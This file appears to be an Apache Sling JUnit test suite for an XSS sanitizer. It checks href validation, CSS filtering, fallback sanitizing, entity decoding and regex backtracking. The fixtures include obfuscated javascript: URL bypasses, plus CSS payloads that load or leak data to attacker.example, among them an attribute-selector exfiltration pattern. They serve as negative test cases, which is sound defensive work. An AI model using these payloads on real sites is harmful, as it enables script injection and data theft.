/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
package org.apache.sling.xss.impl;

import java.io.InputStream;
import java.net.URI;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import org.apache.sling.api.resource.PersistenceException;
import org.apache.sling.api.resource.Resource;
import org.apache.sling.api.resource.external.URIProvider;
import org.apache.sling.commons.metrics.Counter;
import org.apache.sling.commons.metrics.MetricsService;
import org.apache.sling.serviceusermapping.ServiceUserMapped;
import org.apache.sling.testing.mock.sling.ResourceResolverType;
import org.apache.sling.testing.mock.sling.junit5.SlingContext;
import org.apache.sling.testing.mock.sling.junit5.SlingContextExtension;
import org.apache.sling.xss.XSSFilter;
import org.apache.sling.xss.impl.status.XSSStatusService;
import org.jetbrains.annotations.NotNull;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

@ExtendWith(SlingContextExtension.class)
public class XSSFilterImplTest {

    static List<Object[]> dataForValidHref() {
        List<Object[]> testData = new ArrayList<>();
        testData.add(new Object[] {"javascript:alert(1)", false});
        testData.add(new Object[] {"java&Tab;script:void(document.body.dataset.executed=1)", false});
        testData.add(new Object[] {"java&NewLine;script:void(document.body.dataset.executed=1)", false});
        testData.add(new Object[] {"java&#9;script:void(document.body.dataset.executed=1)", false});
        testData.add(new Object[] {"java&#x0A;script:void(document.body.dataset.executed=1)", false});
        testData.add(new Object[] {"java&Tab;script&colon;void(document.body.dataset.executed=1)", false});
        testData.add(new Object[] {"java\rscript:void(document.body.dataset.executed=1)", false});
        testData.add(new Object[] {"\u0001javascript:void(document.body.dataset.executed=1)", false});
        testData.add(new Object[] {"java&amp;Tab;script:void(document.body.dataset.executed=1)", true});
        testData.add(new Object[] {"java&#38;Tab;script:void(document.body.dataset.executed=1)", true});
        testData.add(new Object[] {"", true});
        testData.add(new Object[] {
            "%26%23x6a%3b%26%23x61%3b%26%23x76%3b%26%23x61%3b%26%23x73%3b%26%23x63%3b%26%23x72%3b%26%23x69%3b%26%23x70%3b%26%23x74%3b%26%23x3a%3balert%281%29",
            false
        });
        testData.add(
                new Object[] {"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)", false});
        // HTML5-only named character references (unknown to unescapeHtml4) and numeric references
        // without a terminating semicolon are still decoded by browsers before URL parsing
        testData.add(new Object[] {"java&Tab;script:alert(1)", false});
        testData.add(new Object[] {"java&NewLine;script&colon;alert(1)", false});
        testData.add(new Object[] {"&#106avascript:alert(1)", false});
        testData.add(new Object[] {"%-12", false});
        testData.add(new Object[] {"/promotion/25%/", false});
        testData.add(new Object[] {"#", true});
        testData.add(new Object[] {"?foo=bar", true});
        testData.add(new Object[] {"#javascript:alert(23)", true});
        testData.add(new Object[] {"#\">", false});
        return testData;
    }

    static List<Object[]> dataForCheckMethod() {
        List<Object[]> testData = new ArrayList<>();
        testData.add(new Object[] {"<link media=\"screen\">hello</link>", true});
        testData.add(new Object[] {"<link media=\"testingRege10\">hello</link>", true});
        testData.add(new Object[] {"<style media=\"screen\">h1 {color:red;}</style>", true});
        testData.add(new Object[] {"<link type=\"text/css\">valid Test</link>", true});
        testData.add(new Object[] {"<body bgcolor=\"black\">valid Test</body>", true});
        testData.add(new Object[] {"<div background=\"green\">invalid Test</div>", false});
        testData.add(new Object[] {"<table border=\"3\">valid Test</table>", true});
        testData.add(new Object[] {"<table border=\"green\">invalid Test</table>", false});
        testData.add(new Object[] {"<script>invalid Test</script>", false});
        testData.add(new Object[] {"", false});
        // CSS violations that filter() would strip must not be reported as violation-free by check()
        testData.add(new Object[] {"<style>@import url(\"https://attacker.example/malicious.css\");</style>", false});
        testData.add(new Object[] {
            "<style>input[value^=\"a\"] {background: url(\"//attacker.example/log?a\");}</style>", false
        });
        testData.add(new Object[] {"<p style=\"behavior:url(#default#userData)\">hi</p>", false});
        testData.add(new Object[] {"<style>h1 {color:red; behavior:url(#default#userData);}</style>", false});
        return testData;
    }

    private static final String FALLBACK_TRIGGERING_CONTENT =
            "<a href=\"https://sling.apache.org" + "/a".repeat(1300) + ".\">Click</a>";

    public SlingContext context = new SlingContext(ResourceResolverType.JCR_MOCK);

    private XSSFilterImpl xssFilter;

    @AfterEach
    public void tearDown() {
        xssFilter = null;
    }

    @BeforeEach
    public void setUp() {
        MetricsService metricsService = mock(MetricsService.class);
        when(metricsService.counter(anyString())).thenReturn(mock(Counter.class));
        context.registerService(MetricsService.class, metricsService);
        context.registerService(ServiceUserMapped.class, mock(ServiceUserMapped.class));
        context.registerService(new XSSStatusService());
        xssFilter = context.registerInjectActivateService(new XSSFilterImpl());
    }

    @Test
    public void testResourceBasedPolicy() {
        String policyPath = "/libs/" + XSSFilterImpl.DEFAULT_POLICY_PATH;
        context.load().binaryFile(getPolicyFileAsStream(), policyPath);
        // re-register in order to pick up the newly uploaded policy
        xssFilter = context.registerInjectActivateService(new XSSFilterImpl());
        XSSFilterImpl.AntiSamyPolicy antiSamyPolicy = xssFilter.getActivePolicy();
        assertFalse(antiSamyPolicy.isEmbedded(), "Expected a Resource based policy.");
        assertEquals(policyPath, antiSamyPolicy.getPath(), "This is not the policy we're looking for.");
    }

    @Test
    // see SLING-12366 for why this test exists
    public void testResourceBasedPolicyWithExternalizableBlob() {
        // note: having a URI provided for the policy-resource causes a JcrExternalizableInputStream
        // to be returned from resource.adaptTo(InputStream.class)
        URIProvider uriProvider = new URIProvider() {
            @Override
            public @NotNull URI toURI(
                    @NotNull Resource resource,
                    @NotNull URIProvider.Scope scope,
                    @NotNull URIProvider.Operation operation) {
                return URI.create("https://example.com/blob" + resource.getPath());
            }
        };
        context.registerService(URIProvider.class, uriProvider);

        testResourceBasedPolicy();
    }

    @Test
    public void testPolicyRemovalFallsBackToEmbeddedPolicy() throws PersistenceException {
        String policyPath = "/libs/" + XSSFilterImpl.DEFAULT_POLICY_PATH;
        context.load().binaryFile(getPolicyFileAsStream(), policyPath);
        // re-register in order to pick up the newly uploaded policy
        xssFilter = context.registerInjectActivateService(new XSSFilterImpl());
        assertFalse(xssFilter.getActivePolicy().isEmbedded(), "Expected a Resource based policy.");

        Resource policyResource = context.resourceResolver().getResource(policyPath);
        context.resourceResolver().delete(policyResource);
        context.resourceResolver().commit();

        // simulate the resource change event delivered when the policy resource is removed; this
        // must never leave the filter without a working policy
        xssFilter.updateActivePolicy();

        XSSFilterImpl.AntiSamyPolicy antiSamyPolicy = xssFilter.getActivePolicy();
        assertTrue(antiSamyPolicy.isEmbedded(), "Expected a fallback to the embedded policy.");
        assertTrue(
                xssFilter.check(XSSFilter.DEFAULT_CONTEXT, "<p>some text</p>"),
                "Expected the filter to keep working after the policy resource was removed.");
    }

    @Test
    public void testDefaultEmbeddedPolicy() {
        XSSFilterImpl.AntiSamyPolicy antiSamyPolicy = xssFilter.getActivePolicy();
        assertTrue(antiSamyPolicy.isEmbedded(), "Expected the default embedded policy.");
        assertEquals(
                XSSFilterImpl.EMBEDDED_POLICY_PATH,
                antiSamyPolicy.getPath(),
                "This is not the policy we're looking for.");
    }

    @ParameterizedTest
    @MethodSource("dataForCheckMethod")
    public void testCheckMethod(String input, boolean isValid) {
        if (isValid) {
            assertTrue(xssFilter.check(XSSFilter.DEFAULT_CONTEXT, input), "Expected valid input value for: " + input);
        } else {
            assertFalse(
                    xssFilter.check(XSSFilter.DEFAULT_CONTEXT, input), "Expected invalid input value for: " + input);
        }
    }

    @ParameterizedTest
    @MethodSource("dataForValidHref")
    public void isValidHref(String input, boolean isValid) {
        if (isValid) {
            assertTrue(xssFilter.isValidHref(input), "Expected valid href value for: " + input);
        } else {
            assertFalse(xssFilter.isValidHref(input), "Expected invalid href value for: " + input);
        }
    }

    @Test
    public void testFallbackHrefRegexesDoNotBacktrackPolynomially() {
        // quadratic variant: scheme prefix, long run of characters shared by the overlapping
        // quantified character classes, then a character outside all of them
        String quadratic = "http://" + "a".repeat(100000) + "^";
        // cubic variant: mailto scheme, letters, then a long run of spaces (matched by both the
        // middle character class and the trailing whitespace quantifier), then a non-matching char
        String cubic = "mailto:" + "a".repeat(20000) + " ".repeat(40000) + "^";
        for (String input : new String[] {quadratic, cubic}) {
            long start = System.nanoTime();
            assertFalse(XSSFilterImpl.OFF_SITE_SIMPLIFIED.matcher(input).matches());
            long elapsedMillis = (System.nanoTime() - start) / 1_000_000L;
            // linear matching finishes in a few milliseconds; polynomial backtracking needs
            // minutes to hours for inputs of this size
            assertTrue(
                    elapsedMillis < 5000,
                    "Expected linear-time rejection of a " + input.length() + " character URL, but matching took "
                            + elapsedMillis + "ms.");
        }
    }

    @Test
    public void testFallbackFiltering() {
        assertEquals(FALLBACK_TRIGGERING_CONTENT, xssFilter.filter(FALLBACK_TRIGGERING_CONTENT));
    }

    @Test
    public void testFallbackFilteringDoesNotAllowJavascriptHrefs() {
        // the first anchor makes the primary sanitizer scan abort with a StackOverflowError, so the
        // whole input (including the second and third anchors) is re-scanned with the fallback
        // policy; the simplified fallback href patterns must not keep a javascript: URL alive
        final String input = FALLBACK_TRIGGERING_CONTENT
                + "<a href=\"javascript:alert(document.domain)\">plain</a>"
                + "<a href=\"JaVaScRiPt:alert(document.domain)\">mixed case</a>";
        final String filtered = xssFilter.filter(input);
        assertFalse(
                filtered.toLowerCase(java.util.Locale.ROOT).contains("javascript"),
                "Expected the fallback sanitizer to remove javascript: hrefs, but got: " + filtered);
    }

    @Test
    public void testUnicodeUnescaperDecodesHtml5NamedEntitiesNotOnlyTabNewlineAndColon() {
        // spot-check a few of the HTML5-only named references beyond &Tab;/&NewLine;/&colon; that are
        // exercised by the javascript-scheme-bypass tests, to guard against the entity table silently
        // losing entries or mapping to the wrong character
        assertEquals("a(b)c/d?e", XSSFilterImpl.UNICODE_UNESCAPER.translate("a&lpar;b&rpar;c&sol;d&quest;e"));
        assertEquals("[x]", XSSFilterImpl.UNICODE_UNESCAPER.translate("&lsqb;x&rsqb;"));
    }

    @Test
    public void testUnicodeUnescaperNamedEntitiesAreCaseSensitive() {
        // HTML5 named references are case-sensitive; "&tab;" (lower-case) is not a valid reference and
        // must be left untouched, unlike "&Tab;"
        assertEquals("&tab;", XSSFilterImpl.UNICODE_UNESCAPER.translate("&tab;"));
        assertEquals("\t", XSSFilterImpl.UNICODE_UNESCAPER.translate("&Tab;"));
    }

    @Test
    public void testNumericEntityUnescaperDecimalReferenceWithoutSemicolon() {
        assertEquals("javascript", XSSFilterImpl.NUMERIC_ENTITY_UNESCAPER.translate("&#106avascript"));
    }

    @Test
    public void testNumericEntityUnescaperDecimalReferenceWithSemicolon() {
        assertEquals("javascript", XSSFilterImpl.NUMERIC_ENTITY_UNESCAPER.translate("&#106;avascript"));
    }

    @Test
    public void testNumericEntityUnescaperHexReferenceWithoutSemicolon() {
        assertEquals("Junk", XSSFilterImpl.NUMERIC_ENTITY_UNESCAPER.translate("&#x4Aunk"));
    }

    @Test
    public void testNumericEntityUnescaperHexReferenceWithSemicolon() {
        assertEquals("Junk", XSSFilterImpl.NUMERIC_ENTITY_UNESCAPER.translate("&#x4A;unk"));
    }

    @Test
    public void testNumericEntityUnescaperHexReferenceConsumesTrailingHexLetters() {
        // unlike decimal references, a hex reference without a terminating semicolon keeps consuming
        // digits as long as they are valid hex digits - including letters a-f/A-F - so "&#x6Aa;bc" is
        // parsed as the single hex value 0x6AA, not as 0x6A followed by the literal text "a;bc"
        String expected = new String(Character.toChars(0x6AA)) + "bc";
        assertEquals(expected, XSSFilterImpl.NUMERIC_ENTITY_UNESCAPER.translate("&#x6Aa;bc"));
    }

    @Test
    public void testNumericEntityUnescaperOutOfRangeCodePointDecodesToReplacementCharacter() {
        // browsers decode a numeric reference above the maximum Unicode code point to U+FFFD rather
        // than rejecting it
        assertEquals("�", XSSFilterImpl.NUMERIC_ENTITY_UNESCAPER.translate("&#2000000;"));
    }

    @Test
    public void testNumericEntityUnescaperOverflowingDigitsDecodeToReplacementCharacter() {
        // a digit sequence too large to fit in an int must not throw NumberFormatException out of the
        // translator; it is treated the same as an out-of-range code point
        assertEquals("�", XSSFilterImpl.NUMERIC_ENTITY_UNESCAPER.translate("&#99999999999999;"));
    }

    @Test
    public void testNumericEntityUnescaperIncompleteHexReferenceIsLeftLiteral() {
        assertEquals("&#x", XSSFilterImpl.NUMERIC_ENTITY_UNESCAPER.translate("&#x"));
    }

    @Test
    public void testNumericEntityUnescaperReferenceWithoutDigitsIsLeftLiteral() {
        assertEquals("&#abc", XSSFilterImpl.NUMERIC_ENTITY_UNESCAPER.translate("&#abc"));
    }

    private static @NotNull InputStream getPolicyFileAsStream() {
        return Objects.requireNonNull(
                XSSFilterImplTest.class.getClassLoader().getResourceAsStream(XSSFilterImpl.EMBEDDED_POLICY_PATH),
                "The resource " + XSSFilterImpl.EMBEDDED_POLICY_PATH + " is required to exist for testing.");
    }
}
